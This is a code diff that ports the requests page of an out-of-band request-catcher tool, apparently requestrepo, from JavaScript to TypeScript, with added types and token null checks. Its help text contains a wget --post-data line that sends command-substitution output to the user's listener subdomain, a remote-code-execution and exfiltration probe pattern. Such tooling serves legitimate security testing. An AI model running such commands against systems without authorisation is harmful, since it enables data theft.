@@ -4,35 +4,33 @@ import { EditorComponent } from "./editor";
 import { Button } from "primereact/button";
 import { toast } from "react-toastify";
 import { Utils } from "../utils";
+import { AppSession, Request } from "../types/app-types";
 
-export function RequestsPage({ user, sharedRequest }) {
-  const [isEditorFocused, setIsEditorFocused] = useState(false);
-  const [selectedRequest, setSelectedRequest] = useState(null);
+interface RequestsPageProps {
+  user: AppSession | null;
+  sharedRequest?: Request | null;
+  toast?: typeof toast;
+  activeSession?: string;
+}
 
-  // Check if user has any requests (for notification purposes)
+export function RequestsPage({
+  user,
+  sharedRequest,
+}: RequestsPageProps): React.ReactElement {
+  const [isEditorFocused, setIsEditorFocused] = useState<boolean>(false);
+  const [selectedRequest, setSelectedRequest] = useState<Request | null>(null);
+
   useEffect(() => {
-    // This effect is kept for future use but the state variable is removed
-    // since it's currently unused
-    if (user && user.requests && Object.keys(user.requests).length > 0) {
-      // Logic preserved for future use
-    }
-  }, [user?.requests ? Object.keys(user.requests).length : 0]);
-
-  // Update selected request whenever shared request, user, or user's selectedRequest changes
-  useEffect(() => {
-    // Reset state when user changes
     if (!user) {
       setSelectedRequest(null);
       return;
     }
 
-    // Priority 1: Show shared request if available
     if (sharedRequest) {
       setSelectedRequest(sharedRequest);
       return;
     }
 
-    // Priority 2: Show user's selected request if valid
     if (
       user.selectedRequest &&
       user.requests &&
@@ -42,29 +40,25 @@ export function RequestsPage({ user, sharedRequest }) {
       return;
     }
 
-    // Priority 3: Show first available request if none selected
     if (user.requests && Object.keys(user.requests).length > 0) {
       const requestIds = Object.keys(user.requests);
       setSelectedRequest(user.requests[requestIds[0]]);
       return;
     }
 
-    // If no requests available, set to null
     setSelectedRequest(null);
   }, [
     sharedRequest,
     user,
-    // Track specific changes to avoid dependency on the entire user object
     user?.selectedRequest,
-    // This stringified value changes when requests are added/removed
     user?.requests ? Object.keys(user.requests).length : 0,
   ]);
 
-  const handleEditorFocus = () => {
+  const handleEditorFocus = (): void => {
     setIsEditorFocused(true);
   };
 
-  const handleEditorBlur = () => {
+  const handleEditorBlur = (): void => {
     setIsEditorFocused(false);
   };
 
@@ -79,9 +73,9 @@ export function RequestsPage({ user, sharedRequest }) {
 
   const activeSession = Utils.getActiveSession();
 
-  const token = isEditorFocused ? activeSession.token : "********";
+  const token =
+    isEditorFocused && activeSession ? activeSession.token : "********";
 
-  // parse url into host:port
   let url;
   try {
     url = new URL("http://" + (user?.domain || window.location.hostname) + "/");
@@ -89,10 +83,10 @@ export function RequestsPage({ user, sharedRequest }) {
     url = new URL("http://" + window.location.hostname + "/");
   }
   let port = url.port;
-  if (!port) port = window.location.protocol === "https:" ? 443 : 80;
+  if (!port) port = window.location.protocol === "https:" ? "443" : "80";
 
   const content = `from requestrepo import Requestrepo # pip install requestrepo
-client = Requestrepo(token="${token}", host="${url.hostname}", port=${port}, protocol="${port === 443 ? "https" : "http"}")
+client = Requestrepo(token="${token}", host="${url.hostname}", port=${port}, protocol="${port === "443" ? "https" : "http"}")
 
 print(client.subdomain) # ${user.subdomain}
 print(client.domain) # ${user.subdomain}.${user.domain}
@@ -142,7 +136,7 @@ print("Latest Request:", new_request)`;
             <br />
             <br />
             <code>
-              wget --post-data "$(echo RCE)" -O-{" "}
+              wget --post-data &quot;$(echo RCE)&quot; -O-{" "}
               {user?.url || `${user?.subdomain}.${user?.domain}`}
             </code>
             <br />
@@ -163,11 +157,16 @@ print("Latest Request:", new_request)`;
               Python library:
             </p>
             <CopyButton
-              text={content.replace("********", activeSession.token)}
+              text={content.replace(
+                "********",
+                activeSession ? activeSession.token : "",
+              )}
             />
             <EditorComponent
               value={content}
-              onChange={() => {}}
+              onChange={() => {
+                /* No changes needed */
+              }}
               commands={[]}
               language={"python"}
               onFocus={handleEditorFocus}
@@ -186,8 +185,12 @@ print("Latest Request:", new_request)`;
   );
 }
 
-export const CopyButton = ({ text }) => {
-  const handleCopy = () => {
+interface CopyButtonProps {
+  text: string;
+}
+
+export const CopyButton = ({ text }: CopyButtonProps): React.ReactElement => {
+  const handleCopy = (): void => {
     navigator.clipboard
       .writeText(text)
       .then(() =>
